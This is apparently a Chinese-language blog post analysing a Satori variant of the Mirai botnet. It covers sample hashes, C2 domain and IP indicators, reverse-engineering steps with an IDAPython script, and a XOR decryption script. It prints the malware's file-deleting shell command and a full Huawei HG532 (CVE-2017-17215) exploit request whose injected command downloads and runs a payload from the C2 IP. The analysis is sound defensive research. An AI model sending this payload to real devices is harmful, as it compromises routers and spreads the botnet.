@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | Mirai Botnet分支Satori分析</title><meta name="description" content="&lt;p&gt;暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">Mirai Botnet分支Satori分析</h3><div class="article__date metadata"><div class="post-info">2023/03/25</div></div><div class="article__tags metadata">Tags:
+<a class="article__tags__link metadata" href="/tags/notes/">notes</a><a class="article__tags__link metadata" href="/tags/git/">git</a></div><div class="article__body"><p>暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向</p>
+<span id="more"></span>
+<h2 id="基本情况"><a class="markdownIt-Anchor" href="#基本情况"></a> 基本情况</h2>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>x86_64</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MD5</td>
+<td>fe7ca3b588e342f79c7814bb75dc24d7</td>
+</tr>
+<tr>
+<td>SHA256</td>
+<td>e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><a target="_blank" rel="noopener" href="http://botnet.nguyennghi.info">botnet.nguyennghi.info</a></td>
+</tr>
+<tr>
+<td>ip</td>
+<td>103.183.118.73</td>
+</tr>
+</tbody>
+</table>
+<h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2>
+<h3 id="基本情况-2"><a class="markdownIt-Anchor" href="#基本情况-2"></a> 基本情况</h3>
+<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2dd85cc12949bcd1a7da5287ada77fed.png" alt="image-20230319130912500" style="zoom:50%;" />
+<p>64位ELF可执行文件</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ff35ebac2e5f17da95a18f650aa1c5f6.png" alt="image-20230319131036258" /></p>
+<h3 id="逆向工程"><a class="markdownIt-Anchor" href="#逆向工程"></a> 逆向工程</h3>
+<p>通过start找到main函数</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7f9086994f2d20a717a754d858293a59.png" alt="image-20230319131156050" /></p>
+<p>使用IDApython脚本对类似的库函数实现进行函数重命名</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6ae388e053568f7e0b6209cf80082bbd.png" alt="image-20230319131304684" /></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    func = idaapi.get_func(func_ea)</span><br><span class="line">    name = idaapi.get_func_name(func_ea)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> head <span class="keyword">in</span> idautils.Heads(func.start_ea, func.end_ea):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = idc.GetDisasm(head)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;syscall&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Function: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name).ljust(<span class="number">0x40</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(code[<span class="number">21</span>:].ljust(<span class="number">0x30</span>,<span class="string">&quot;=&quot;</span>))</span><br><span class="line">                ida_name.set_name(func.start_ea, code[<span class="number">21</span>:])</span><br><span class="line">                idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9699218d050e3277b97c149a5001e218.png" alt="image-20230319131712988" /></p>
+<p><strong>main函数</strong></p>
+<ol>
+<li>
+<p>首先创建向<code>8.8.8.8:13568</code>的socket连接，通过<code>getsockname</code>测试网络是否连通并获得本机ip地址</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e1856f6f33f0c1ef5976e312ad0722e2.png" alt="image-20230319133229045" /></p>
+</li>
+<li>
+<p>初始化加密消息</p>
+<p>由于使用未知版本的lib库进行静态编译，所以需要手动识别一些lib函数。</p>
+<p>比如这里使用<code>malloc</code>分配并将密文使用<code>strncpy</code>将消息复制到堆中</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7058438640f17abd7da5ae8736403663.png" alt="image-20230319145038585" /></p>
+</li>
+<li>
+<p>利用<code>pid</code>和随机数进行随机数生成，对进程进行随机改名</p>
+<ul>
+<li>
+<p>将time生成的伪随机数和pid进行异或等操作得到随机数</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c3fa4dc9012d5d9d226257bc0a7ad6e8.png" alt="image-20230319145721197" /></p>
+</li>
+<li>
+<p>通过位移等操作实现随机数的范围控制</p>
+</li>
+</ul>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c16e53f2ec6c8b3dd41d531f26f25633.png" alt="image-20230319145655202" /></p>
+<ul>
+<li>
+<p>在之后使用<code>ptrcl</code>进行进程的重命名</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f9ee442f2eb39f67156721672c18f159.png" alt="image-20230319164552839" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>拼接指令过后，修改相关信号变量值，并在<code>vfork</code>的<code>execl</code>中执行</p>
+<ul>
+<li>
+<p>拼接命令字符串</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e8dc6791e9c8617b59761f5d15e5999c.png" alt="image-20230319164254112" /></p>
+</li>
+<li>
+<p>设置信号量并使用vfork执行</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/69316bf83fad9f326f58e874975dd2e6.png" alt="image-20230319164122065" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/16fb3f0838f0cffc01c01207cb1f8c5c.png" alt="image-20230319163508664" /></p>
+</li>
+<li>
+<p>vfork部分</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/268aff2f4a3d3e64a33004ceef665ca9.png" alt="image-20230319164454462" /></p>
+</li>
+<li>
+<p>执行的语句为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name</span><br></pre></td></tr></table></figure>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \336\377\377\377\177; &gt;bin/watchdog &amp;&amp;  mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog</span><br></pre></td></tr></table></figure>
+<ol>
+<li>随机选择  <code>&quot;/bin/busybox&quot;;</code>、<code>&quot;/bin/watchdog&quot;</code>、<code>&quot;/bin/systemd&quot;</code>中的一个（<code>$root_random_name</code>）中的一个<strong>删除</strong></li>
+<li>当前文件夹创建<code>bin</code>目录</li>
+<li>将当前目录下的病毒移动至创建的<code>bin</code>目录中，并重命名<code>$root_random_name</code></li>
+<li>给予<code>bin/$root_random_name</code>最高权限</li>
+</ol>
+<p>通过多次运行可以成功实现，如果<code>&amp;&amp; mkdir bin \336\377\377\377\177</code>中没有乱码，那么就会执行后一句</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e6955edfd176db8c53e504286d3be6d7.png" alt="image-20230319230512195" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>使用异或解密字符串并打印，完成后加密字符串</p>
+<ul>
+<li>
+<p>过程</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2cf1740082e2104f5c6be1f730334279.png" alt="image-20230319173516052" /></p>
+</li>
+<li>
+<p>利用其自身的解密脚本，可以解密所有密文</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">str1 = [ <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x41</span>, <span class="number">0x2E</span>]</span><br><span class="line">str2 = [<span class="number">0x4A</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>]</span><br><span class="line">str3 = [<span class="number">0x01</span>, <span class="number">0x5E</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x2E</span>]</span><br><span class="line">str4 = [<span class="number">0x01</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line">str5 = [<span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x2E</span>]</span><br><span class="line">str6 = [<span class="number">0x01</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="number">0x6D53D2C2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher:<span class="built_in">list</span></span>):</span><br><span class="line">    v3 = key &amp; <span class="number">0xFF</span></span><br><span class="line">    v4 = key &gt;&gt; <span class="number">8</span></span><br><span class="line">    v5 = (key &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    v6 = (key &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        result += <span class="built_in">chr</span>((i^v3^v4^v5^v6 )&amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>, decrypt(str1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2&quot;</span>, decrypt(str2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3&quot;</span>, decrypt(str3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;4&quot;</span>, decrypt(str4))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;5&quot;</span>, decrypt(str5))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6&quot;</span>, decrypt(str6))</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/23f89924f7290216402f2dbee10c1f43.png" alt="image-20230319220907909" /></p>
+</li>
+<li>
+<p>加密字符串，由于是异或加密，所以加解密算法一致</p>
+</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/603b9a71f69d32f0b9937d4c40d4e2eb.png" alt="image-20230319174504355" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8c79bfcbe91463df2c3555e3de8b40d0.png" alt="image-20230319174521783" /></p>
+<ol start="6">
+<li>
+<p>合适函数表，讲函数放到一个table中</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6e49a88320fb86ab46e96687914965bd.png" alt="image-20230325174924309" /></p>
+</li>
+<li>
+<p>使用<code>fork</code>获得子进程，打开<code>/proc</code>文件夹并读取其中的文件，关闭除必要进程外的所有进程</p>
+<ul>
+<li>
+<p>打开<code>/proc/</code>文件夹</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fc58ad13d588c9c5bfd0718b076a8ec8.png" alt="image-20230325175147772" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c52029cd2018a1d2b7c8cd50bfb58c4b.png" alt="image-20230325175200591" /></p>
+</li>
+<li>
+<p>关闭除必要进程外的所有进程</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f6c419b41761495db52182270509e87f.png" alt="image-20230325175235928" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>使用SSDP协议进行网络发包，使用华为HG532远程命令执行漏洞（CVE-2017-17215）的payload进行发包，进行攻击</p>
+<ul>
+<li>
+<p>进行攻击</p>
+<ol>
+<li>
+<p>创建socket</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/82f418b30b12d5cd5f0340a65dacecd5.png" alt="image-20230325175953274" /></p>
+</li>
+<li>
+<p>设置 socket 选项，允许向组播地址发送数据</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5df10655306d34b61114564c0e610cf9.png" alt="image-20230325181258334" /></p>
+</li>
+<li>
+<p>设置目标地址和端口号</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5fdd3eff4830d76f22e248fac58f4c1c.png" alt="image-20230325181453140" /></p>
+</li>
+<li>
+<p>构造 M-SEARCH 请求报文，发送搜索请求</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f6ec95904237a3f131f02eb4eed5db82.png" alt="image-20230325175636859" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1a9561f1e58f0b6efcd84e98fa54dad6.png" alt="image-20230325175725576" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3331ad455db311c3c1ae6f49c223d273.png" alt="image-20230325175739448" /></p>
+</li>
+</ol>
+</li>
+<li>
+<p>payload分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e</span><br><span class="line">3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line">Content-Length: 457</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">    &lt;s:Body&gt;</span><br><span class="line">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line">        &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt;</span><br><span class="line">        &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;</span><br><span class="line">        &lt;/u:Upgrade&gt;</span><br><span class="line">    &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>核心语句</p>
+<p><code>/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei</code></p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="网络连接相关"><a class="markdownIt-Anchor" href="#网络连接相关"></a> 网络连接相关</h2>
+<h3 id="dns-server"><a class="markdownIt-Anchor" href="#dns-server"></a> DNS SERVER</h3>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a>.</th>
+<th>173.245.59.65 <a target="_blank" rel="noopener" href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a></th>
+<th>CLOUDFLARENET United States</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a>.</td>
+<td>108.162.194.192 <a target="_blank" rel="noopener" href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a></td>
+<td>CLOUDFLARENET United States</td>
+</tr>
+</tbody>
+</table>
+<h3 id="host-records-a"><a class="markdownIt-Anchor" href="#host-records-a"></a> Host Records (A)</h3>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="http://nguyennghi.info">nguyennghi.info</a>    HTTP: cloudflare</th>
+<th>104.21.78.122</th>
+<th>CLOUDFLARENET unknown</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://antiddos.nguyennghi.info">antiddos.nguyennghi.info</a></td>
+<td>103.161.181.140</td>
+<td>DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://checkht4gvpn.nguyennghi.info">checkht4gvpn.nguyennghi.info</a>    <br>HTTP: cloudflare</td>
+<td>172.67.220.248</td>
+<td>CLOUDFLARENET United States</td>
+</tr>
+</tbody>
+</table>
+</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/05/24/windows-kernel-1-baisc/">prev_post</a><a class="pagination__link pagination__next" href="/2023/02/17/windows_kernel_driver_2/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
